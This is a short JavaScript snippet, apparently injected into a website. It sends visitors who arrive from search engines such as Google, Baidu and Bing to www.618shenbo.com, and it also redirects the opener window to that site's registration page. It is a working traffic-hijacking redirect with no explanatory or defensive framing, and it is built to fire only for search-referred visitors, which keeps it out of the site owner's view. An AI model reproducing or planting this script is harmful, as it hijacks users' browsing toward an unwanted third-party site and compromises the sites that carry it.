if(window.name != 'ad_app6'){
	var r = document.referrer;
	r = r.toLowerCase();
	var aSites = new Array('google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.','anquan.','haosou.','sm.','bing.');
	var b = false;
	for (i in aSites){
		if (r.indexOf(aSites[i]) > 0){
			b = true;
			break;
		}
	}
	
	if(b)
	{
		self.location = 'http://www.618shenbo.com/#/';
parent.window.opener.location = "http://www.618shenbo.com/register.html#/";
		window.adworkergo = 'ad_app6';
	}
}